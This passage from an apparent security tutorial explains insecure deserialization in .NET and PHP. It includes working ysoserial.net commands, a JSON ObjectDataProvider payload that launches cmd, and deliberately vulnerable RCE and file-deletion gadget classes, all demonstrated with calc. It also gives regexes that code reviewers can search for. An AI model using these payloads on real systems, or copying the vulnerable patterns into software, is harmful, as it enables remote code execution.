00000820  2e 53 74 72 69 6e 67 29  08 00 00 00 0a 01 10 00  |.String)........|
00000830  00 00 08 00 00 00 06 1b  00 00 00 71 53 79 73 74  |...........qSyst|
00000840  65 6d 2e 43 6f 6d 70 61  72 69 73 6f 6e 60 31 5b  |em.Comparison`1[|
00000850  5b 53 79 73 74 65 6d 2e  53 74 72 69 6e 67 2c 20  |[System.String, |
00000860  6d 73 63 6f 72 6c 69 62  2c 20 56 65 72 73 69 6f  |mscorlib, Versio|
00000870  6e 3d 34 2e 30 2e 30 2e  30 2c 20 43 75 6c 74 75  |n=4.0.0.0, Cultu|
00000880  72 65 3d 6e 65 75 74 72  61 6c 2c 20 50 75 62 6c  |re=neutral, Publ|
00000890  69 63 4b 65 79 54 6f 6b  65 6e 3d 62 37 37 61 35  |icKeyToken=b77a5|
000008a0  63 35 36 31 39 33 34 65  30 38 39 5d 5d 09 0c 00  |c561934e089]]...|
000008b0  00 00 0a 09 0c 00 00 00  09 18 00 00 00 09 16 00  |................|
000008c0  00 00 0a 0b                                       |....|
</pre></div>

<p>Trying to deserialize the above object would cause a calculator to spawn on the system. As observable from the command, we used the gadget <code>TypeConfuseDelegate</code> as a valid gadget for exploitation, the process used by this gadget is different yet similar to the one used above by our custom implemented RCE class. </p>
<p>Before digging deep into the process used by <code>TypeConfuseDelegate</code>, let&rsquo;s first describe how the Delegate class is used in the .NET architecture, and how it can be exploited by insecure deserialization in a similar way to the above RCE class. Let&rsquo;s then consider the following class:</p>
<div class="codehilite"><pre><span class="na">[Serializable]</span> 
<span class="k">public</span> <span class="k">class</span> <span class="nc">WrapEvent</span> <span class="p">:</span> <span class="n">IDeserializationCallback</span>
<span class="p">{</span>
    <span class="n">Delegate</span> <span class="n">_delegated</span><span class="p">;</span>
    <span class="kt">string</span> <span class="n">_parameters</span><span class="p">;</span>
    <span class="k">public</span> <span class="nf">WrapEvent</span><span class="p">(</span><span class="n">Delegate</span> <span class="n">delegated</span><span class="p">,</span> <span class="kt">string</span> <span class="n">parameters</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">_delegated</span> <span class="p">=</span> <span class="n">delegated</span><span class="p">;</span>
        <span class="n">_parameters</span> <span class="p">=</span> <span class="n">parameters</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="kt">bool</span> <span class="nf">Run</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="n">_delegated</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">(</span><span class="n">_parameters</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">void</span> <span class="nf">OnDeserialization</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">Run</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

<p>How can this be exploited? The main idea is to find a way to set the <code>_delegate</code> parameter to <code>System.Diagnostic.Process</code> and <code>_parameters</code> to a command we want to execute. </p>
<p>To achieve this result, <code>TypeConfuseDelegate</code> generates a payload operating the following steps:</p>
<ol>
<li>Create a Comparison object (function to compare strings)</li>
<li>Create a MulticastDelegate with two entries, setting both of them to Comparison (so now we have MulticastDelegate<Comparison(String,String),Comparison(String,String)>)</li>
<li>Create a SortedSet, and associate the ComparisonComparer as the compare function  </li>
<li>Using introspection, change the type of one of the Comparison objects to Process.Start<ul>
<li>This works because, by default, Microsoft doesn&rsquo;t enforce type signatures of delegate objects</li>
</ul>
</li>
<li>Add to the SortedSet two strings (&ldquo;cmd&rdquo;, &ldquo;args&rdquo;)</li>
</ol>
<p><em>Note that cmd, args could be any command - args combination</em></p>
<p>Upon deserialization, the following would then happen:</p>
<ol>
<li>To rebuild the SortedSet, the comparison function is reinitialised</li>
<li>The ComparerComparison calls the MulticastDelegate as its comparison delegate</li>
<li>To operate the comparison, the MulticastDelegate runs the Compare() and Start() functions in parallel</li>
<li>Compare() will just compare &ldquo;cmd&rdquo; and &ldquo;arg&rdquo; as strings</li>
<li>Start() will spawn a process and execute the &ldquo;cmd&rdquo; and &ldquo;args&rdquo; as OS commands</li>
</ol>
<h4 id="net-text-based-archive-format">.NET: Text-Based Archive Format<a class="headerlink" href="#net-text-based-archive-format" title="Permanent link"></a></h4>
<p>As for JAVA, .NET is not immune to deserialization issues affecting Text-Based archive formats, such as XML, JSON, [Net]DataContract. These formats are usually handled by the following serializers:</p>
<ul>
<li>XmlSerializer (XML)</li>
<li>[Net]DataContractSerializer (XML dialect)</li>
<li>JavaScriptSerializer (JSON)</li>
</ul>
<p><strong>XML</strong></p>
<p>As an example of XML Serialization, let&rsquo;s consider the following example:</p>
<div class="codehilite"><pre><span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">xmlDesertDeserial</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">)</span> 
<span class="p">{</span>
    <span class="kt">var</span> <span class="n">stream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">FileStream</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">FileMode</span><span class="p">.</span><span class="n">Open</span><span class="p">,</span> <span class="n">FileAccess</span><span class="p">.</span><span class="n">Read</span><span class="p">);</span>
    <span class="kt">var</span> <span class="n">reader</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StreamReader</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
    <span class="n">XmlSerializer</span> <span class="n">serializer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">XmlSerializer</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">Desert</span><span class="p">));</span>
    <span class="c1">// Deseriliazing a dEsert object.. isn&#39;t it?</span>
    <span class="kt">var</span> <span class="n">desert</span> <span class="p">=</span> <span class="p">(</span><span class="n">Desert</span><span class="p">)</span><span class="n">serializer</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">reader</span><span class="p">);</span>
    <span class="n">reader</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
    <span class="n">stream</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
<span class="p">}</span>
</pre></div>

<p>The only valuable pieces to note are:</p>
<ul>
<li>The <code>(Desert)serializer.Deserialize(reader)</code> cast doesn&rsquo;t offer any additional protection, as the cast logically comes AFTER the deserialization process</li>
<li>The <code>typeof(Desert)</code> will forbid the XmlSerializer to deserialize other Classes</li>
</ul>
<p>So, if we craft an xml using the following serializer, it won&rsquo;t work:</p>
<div class="codehilite"><pre><span class="na"> [Serializable]</span>
<span class="k">public</span> <span class="k">class</span> <span class="nc">RCE</span>
<span class="p">{</span>
    <span class="k">private</span> <span class="n">String</span> <span class="n">_cmd</span> <span class="p">=</span> <span class="s">&quot;calc.exe&quot;</span><span class="p">;</span>
    <span class="k">public</span> <span class="n">String</span> <span class="n">cmd</span>
    <span class="p">{</span>
        <span class="k">get</span> <span class="p">{</span> <span class="k">return</span> <span class="n">_cmd</span><span class="p">;</span>  <span class="p">}</span>
        <span class="k">set</span> <span class="p">{</span> <span class="n">_cmd</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span> <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">void</span> <span class="nf">Run</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span> <span class="n">p</span> <span class="p">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">();</span>
        <span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">FileName</span> <span class="p">=</span> <span class="n">_cmd</span><span class="p">;</span>
        <span class="n">p</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
        <span class="n">p</span><span class="p">.</span><span class="n">Dispose</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">xmlRCESerial</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">)</span> 
<span class="p">{</span>
    <span class="c1">// Create desert name</span>
    <span class="kt">var</span> <span class="n">rce</span> <span class="p">=</span> <span class="k">new</span> <span class="n">RCE</span><span class="p">();</span>
    <span class="c1">// Persist to file</span>
    <span class="n">TextWriter</span> <span class="n">writer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StreamWriter</span><span class="p">(</span><span class="n">filename</span> <span class="p">+</span> <span class="s">&quot;.xml&quot;</span><span class="p">);</span>
    <span class="n">XmlSerializer</span> <span class="n">serializer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">XmlSerializer</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">Desert</span><span class="p">));</span>
    <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Serializing desert (!?)&quot;</span><span class="p">);</span>
    <span class="n">serializer</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span> <span class="n">rce</span><span class="p">);</span>
    <span class="n">writer</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
<span class="p">}</span> 
</pre></div>

<p>However, it is possible to exploit this function chaining POP gadgets. To generate a valid payload, in this case, we can use <code>ysoserial.net</code>:</p>
<div class="codehilite"><pre><span class="nv">$ </span>ysoserial-net -g ObjectDataProvider -f XmlSerializer -c <span class="s2">&quot;calc&quot;</span> -o raw
</pre></div>

<p><strong>JSON</strong></p>
<p>In their research, <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf">Firday the 13th, JSON Attacks</a>, Alvaro Muñoz and Oleksandr Mirosh explained how it was possible to apply similar methods seen for JAVA JSON deserialization to exploit .NET JSON deserialization. The research is extremely accurate, and points out a list of libraries affected by this vulnerability. As such, I won&rsquo;t cover in details every library, but focus more on explaining that no concrete difference exists between JSON and XML/Binary deserialization in terms of exploitation.</p>
<p>The research states that, in order to successfully exploit JSON deserialization, the following conditions must be satisfied:</p>
<ol>
<li>Attacker can control type of reconstructed objects [Same as binary/xml]<ul>
<li>Can specify Type<ul>
<li>_type, $type, class, classname, javaClass, &hellip;, etc.</li>
</ul>
</li>
<li>Library loads and instantiate Type</li>
</ul>
</li>
<li>Library/GC will call methods on reconstructed objects [Setter/Getter/Constructors/Destructors, same as for binary/xml]</li>
<li>There are gadget chains starting on method executed upon/after reconstruction [Visibility constraint, same as for binary/xml]</li>
</ol>
<p>As highlighted, there is no big difference from the constraints we&rsquo;ve seen so far.</p>
<p>In order to show that, we&rsquo;ll take as example <code>JavaScriptSerializer</code>. The reason I love pwning this kind of serializer is the fact that it is not vulnerable by itself. It becomes vulnerable if used in combination with <code>SimpleTypeResolver</code>.
To explain what I&rsquo;m saying, let&rsquo;s consider the following vulnerable example:</p>
<div class="codehilite"><pre><span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">jsonRCEDeserial</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">filename</span> <span class="p">+=</span> <span class="s">&quot;.json&quot;</span><span class="p">;</span>
    <span class="c1">// Vulnerable use of JavaScriptSerializer</span>
    <span class="n">JavaScriptSerializer</span> <span class="n">serializer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">JavaScriptSerializer</span><span class="p">(</span><span class="k">new</span> <span class="n">SimpleTypeResolver</span><span class="p">());</span>
    <span class="kt">var</span> <span class="n">stream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">FileStream</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">FileMode</span><span class="p">.</span><span class="n">Open</span><span class="p">,</span> <span class="n">FileAccess</span><span class="p">.</span><span class="n">Read</span><span class="p">);</span>
    <span class="kt">var</span> <span class="n">reader</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StreamReader</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
    <span class="kt">var</span> <span class="n">desert</span> <span class="p">=</span> <span class="n">serializer</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">&lt;</span><span class="n">Desert</span><span class="p">&gt;(</span><span class="n">reader</span><span class="p">.</span><span class="n">ReadToEnd</span><span class="p">());</span>
    <span class="n">reader</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
    <span class="n">stream</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
<span class="p">}</span>

<span class="na">[Serializable]</span>
<span class="k">public</span> <span class="k">class</span> <span class="nc">RCE</span> 
<span class="p">{</span>
    <span class="k">private</span> <span class="n">String</span> <span class="n">_cmd</span><span class="p">;</span>
    <span class="k">public</span> <span class="n">String</span> <span class="n">cmd</span>
    <span class="p">{</span>
        <span class="k">get</span> <span class="p">{</span> <span class="k">return</span> <span class="n">_cmd</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">set</span>
        <span class="p">{</span>
            <span class="n">_cmd</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span>
            <span class="n">Run</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">void</span> <span class="nf">Run</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span> <span class="n">p</span> <span class="p">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">();</span>
        <span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">FileName</span> <span class="p">=</span> <span class="n">_cmd</span><span class="p">;</span>
        <span class="n">p</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
        <span class="n">p</span><span class="p">.</span><span class="n">Dispose</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="na">[Serializable]</span>
<span class="k">public</span> <span class="k">class</span> <span class="nc">Desert</span>
<span class="p">{</span>
    <span class="k">private</span> <span class="n">String</span> <span class="n">_name</span><span class="p">;</span>
    <span class="k">public</span> <span class="n">String</span> <span class="n">name</span>
    <span class="p">{</span>
        <span class="k">get</span> <span class="p">{</span> <span class="k">return</span> <span class="n">_name</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">set</span> <span class="p">{</span> <span class="n">_name</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span> <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Desert name: &quot;</span> <span class="p">+</span> <span class="n">_name</span><span class="p">);</span> <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

<p>As you can see, the serializer is unsafely used to deserialize an expected Desert object. However, the type definition on the deserializer doesn&rsquo;t forbid the deserialization of unknown objects, as <code>JavaScriptSerializer</code> doesn&rsquo;t perform any kind of whitelisting or object inspection. As such, like we previously explained, the <code>RCE</code> class can be used as a valid gadget, triggering a remote command execution during the deserialization process. </p>
<p>To build a successful payload, the following code can be used:</p>
<p><div class="codehilite"><pre><span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">jsonRCESerial</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">filename</span> <span class="p">+=</span> <span class="s">&quot;.json&quot;</span><span class="p">;</span>
    <span class="kt">var</span> <span class="n">desert</span> <span class="p">=</span> <span class="k">new</span> <span class="n">RCE</span><span class="p">();</span>
    <span class="n">desert</span><span class="p">.</span><span class="n">cmd</span> <span class="p">=</span> <span class="s">&quot;calc.exe&quot;</span><span class="p">;</span>
    <span class="c1">// Persist to file</span>
    <span class="k">using</span> <span class="p">(</span><span class="n">StreamWriter</span> <span class="n">stream</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="n">CreateText</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Serializing RCE&quot;</span><span class="p">);</span>
        <span class="n">JavaScriptSerializer</span> <span class="n">serializer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">JavaScriptSerializer</span><span class="p">();</span>
        <span class="n">stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">serializer</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">desert</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
Which would produce the following payload:</p>
<div class="codehilite"><pre><span class="o">{</span><span class="s2">&quot;__type&quot;</span>:<span class="s2">&quot;BinarySerialization.RCE, BinarySeriliazer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null&quot;</span>,<span class="s2">&quot;cmd&quot;</span>:<span class="s2">&quot;calc.exe&quot;</span><span class="o">}</span>
</pre></div>

<p>Of course, it is also possible to generate an exploitation payload using <code>ysoserial.net</code>:</p>
<div class="codehilite"><pre><span class="nv">$ </span>ysoserial-net -g ObjectDataProvider -f JavaScriptSerializer -c <span class="s2">&quot;calc&quot;</span> -o raw
<span class="o">{</span>
    <span class="s1">&#39;__type&#39;</span>:<span class="s1">&#39;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#39;</span>,
    <span class="s1">&#39;MethodName&#39;</span>:<span class="s1">&#39;Start&#39;</span>,
    <span class="s1">&#39;ObjectInstance&#39;</span>:<span class="o">{</span>
        <span class="s1">&#39;__type&#39;</span>:<span class="s1">&#39;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#39;</span>,
        <span class="s1">&#39;StartInfo&#39;</span>: <span class="o">{</span>
            <span class="s1">&#39;__type&#39;</span>:<span class="s1">&#39;System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#39;</span>,
            <span class="s1">&#39;FileName&#39;</span>:<span class="s1">&#39;cmd&#39;</span>,
            <span class="s1">&#39;Arguments&#39;</span>:<span class="s1">&#39;/c calc&#39;</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>

<p><strong>Tips for Source Code reviewers</strong></p>
<p>To find this kind of vulnerability it is usually a good start to search the code for common regexes, like: </p>
<ul>
<li><code>(JavaScript|Xml|(Net)*DataContract)Serializer</code></li>
<li><code>(Binary|ObjectState|Los|Soap|Client|Server)Formatter</code></li>
<li><code>Json.Net</code></li>
<li><code>YamlDotNet</code></li>
<li><code>FastJson</code></li>
<li><code>Xaml</code></li>
<li><code>TypeNameHandling</code></li>
<li><code>SimpleTypeResolver</code></li>
<li><code>(Serialization|Deerialize|UnsafeDeserialize)</code></li>
<li><code>(ComponentModel.Activity|Load|Activity.Load)</code></li>
<li><code>ResourceReader</code></li>
<li><code>(ProxyObject|DecodeSerializedObject|DecodeValue)</code></li>
<li><code>ServiceStack.Text</code></li>
</ul>
<p>For each match, the code should be manually inspected to see whether the object being deserialized can be manipulated by an external attacker.</p>
<h4 id="references_1">References:<a class="headerlink" href="#references_1" title="Permanent link"></a></h4>
<ul>
<li><a href="https://stackoverflow.com/questions/3052202/how-to-analyse-contents-of-binary-serialization-stream">Analyse Binary Serialization Stream</a></li>
<li><a href="https://github.com/pwntester/ysoserial.net/">ysoserial.net</a></li>
<li><a href="https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf">Are you my type?</a></li>
<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf">Friday the 13th: JSON Attacks</a></li>
</ul>
<h3 id="php">PHP<a class="headerlink" href="#php" title="Permanent link"></a></h3>
<p>PHP offers native serialization support via its to methods <code>serialize()</code> and <code>unserialize()</code> which can be used to perform serialization and deserialization of any PHP object that should be stored, transfered or transformed. The PHP serialized object format, it&rsquo;s not far from a JSON array and it&rsquo;s human readable.</p>
<div class="codehilite"><pre>PHP serialized object example:
O:8:&quot;abcd1234&quot;:1:{s:7:&quot;AString&quot;;s:13:&quot;AnotherString&quot;;}
</pre></div>

<p>How to read it?</p>
<ul>
<li>O: Object</li>
<li>8: Class Name Length</li>
<li>&ldquo;abcd1234&rdquo;: Class Name</li>
<li>1: Number of properties</li>
<li>{}: Properties</li>
<li>s:7: String of length 7</li>
<li>s:13: String of length 13</li>
</ul>
<p>A good example of serialized object in PHP is the session file, usually stored within <code>/var/lib/php5/sess_[PHPSESSID]</code>.</p>
<h4 id="php-how-the-exploitation-works">PHP: How the exploitation works<a class="headerlink" href="#php-how-the-exploitation-works" title="Permanent link"></a></h4>
<p>The exploitation in PHP strictly depends on the application specific implementation. What does that mean? As we already seen for JAVA and .NET, exploiting deserialization require chaining or exploiting class/objects which are implemented in a specific way (gadgets). That would mean that, if a PHP application was built in pure functional PHP, there would be no way to find valid POP gadgets, and that would make virtually impossible to exploit this kind of issue. Even in the case a
To make things more complicated, PHP libraries are not uniformly shared among PHP based frameworks/applications; as such, the process of generalizing this kind of exploit is unfeasible. </p>
<p>Obviously, it doesn&rsquo;t mean that we cannot exploit it, it means just that we potentially need to find a different suitable vector for any different application we are testing. </p>
<p>To understand what to look for when hunting this kind of vulnerabilities, we need to deeply understand the application flow during data deserialization.</p>
<p>PHP mainly serialize/deserialize data using <code>serialize</code> and <code>unserialize</code> functions. These two functions are not vulnerable themselves, so we&rsquo;ll need to study which objects are handled by these functions, in order to know if an exploitable condition exists.</p>
<p>Before going further, it&rsquo;s better to introduce PHP Magic Methods. In PHP, Magic methods are merely functions of the standard API to be used in Object-Oriented PHP. The interesting things of this methods is that they are automatically called if certain conditions are met. The most known magic methods are:</p>
<ul>
<li><code>__construct()</code> PHP class constructor, if implemented within a class, it is automatically called upon object creation</li>
<li><code>__destruct()</code> PHP class destructor, if implemented within a class, it is automatically called when references to the object are removed from memory</li>
<li><code>__toString()</code> PHP call-back that gets executed if the object is treated like a string</li>
<li><code>__wakeup()</code> PHP call-back that gets executed upon deserialization</li>
</ul>
<p>For an exhaustive list of all PHP magic methods, refer to the following link:</p>
<ul>
<li><a href="https://www.php.net/manual/en/language.oop5.magic.php">https://www.php.net/manual/en/language.oop5.magic.php</a></li>
</ul>
<h4 id="how-to-search-for-valid-gadgets">How to search for valid &ldquo;gadgets&rdquo;<a class="headerlink" href="#how-to-search-for-valid-gadgets" title="Permanent link"></a></h4>
<p>After the call to <code>unserialize</code>, a magic method may be called on the deserialized object, which can potentially lead to an RCE.</p>
<p>To see how the process works, let&rsquo;s analyse the following example:</p>
<div class="codehilite"><pre><span class="cp">&lt;?php</span>

<span class="k">class</span> <span class="nc">RCE</span> <span class="p">{</span>

    <span class="k">public</span> <span class="nv">$cmd</span><span class="p">;</span>

    <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="nv">$cmd</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">__wakeup</span><span class="p">(){</span>
        <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">FileDelete</span><span class="p">{</span>

    <span class="k">public</span> <span class="nv">$filename</span><span class="p">;</span>

    <span class="k">function</span> <span class="nf">usefile</span><span class="p">(){</span>
        <span class="c1">// Do something</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">__destruct</span><span class="p">(){</span>
        <span class="nb">unlink</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Desert</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>

    <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
        <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[+] Constructing new desert!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">__toString</span><span class="p">(){</span>
        <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[+] The desert is called: </span><span class="si">$this-&gt;name</span><span class="s2">!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">__wakeup</span><span class="p">(){</span>
        <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[+] New Desert created! Hello </span><span class="si">$this-&gt;name</span><span class="s2">!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">__destruct</span><span class="p">(){</span>
        <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[+] Bye Bye </span><span class="si">$this-&gt;name\n</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="p">}</span>

<span class="p">}</span>

<span class="nv">$testfile</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;test&quot;</span><span class="p">,</span> <span class="s2">&quot;w+&quot;</span><span class="p">);</span>
<span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$testfile</span><span class="p">);</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[-] Not enough parameters&quot;</span><span class="p">);</span>
<span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&quot;-d&quot;</span><span class="p">){</span>
    <span class="nv">$desert</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;desert&quot;</span><span class="p">));</span>
<span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">((</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&quot;-e&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$argc</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)){</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&quot;desert&quot;</span><span class="p">){</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">&quot;desert&quot;</span><span class="p">,</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Desert</span><span class="p">(</span><span class="s2">&quot;Sahara&quot;</span><span class="p">)));</span>
    <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&quot;rce&quot;</span><span class="p">){</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">&quot;desert&quot;</span><span class="p">,</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">RCE</span><span class="p">(</span><span class="s2">&quot;cmd /c calc&quot;</span><span class="p">)));</span>
    <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;file-delete&quot;</span><span class="p">){</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">&quot;desert&quot;</span><span class="p">,</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">FileDelete</span><span class="p">(</span><span class="s2">&quot;test&quot;</span><span class="p">)));</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>This tiny script act as both a serializer and deserializer for three different classes, that for sake of simplicity are named in a very intuitive way, respecting the standard format of the other examples we&rsquo;ve seen so far.</p>
<p>Important things to note within the script:</p>
<ul>
<li>The class RCE is a valid PHP gadget for remote command execution, with the potential vector <code>__wakeup</code></li>
<li>The class FileDelete is a valid gadget for Arbitrary File Deletion, with the potential vector <code>__destruct</code></li>
<li>The class Desert is the main, good class. We&rsquo;ll use it to study to trace function calls during deserialization</li>
</ul>
<p><strong>Function Calls</strong></p>
<p>If we generate a valid desert file, using the following command:</p>
<div class="codehilite"><pre><span class="nv">$ </span>php php-desert.php -e desert
<span class="o">[</span>+<span class="o">]</span> Constructing new desert!
<span class="o">[</span>+<span class="o">]</span> Bye Bye Sahara
</pre></div>

<p>Studying the output, we can clearly see that both the <code>__construct</code> and <code>__destruct</code> are called. Let&rsquo;s then try to deserialize it, as following:</p>
<div class="codehilite"><pre><span class="nv">$ </span>php php-desert.php -d
<span class="o">[</span>+<span class="o">]</span> New Desert created! Hello Sahara!
<span class="o">[</span>+<span class="o">]</span> Bye Bye Sahara
</pre></div>

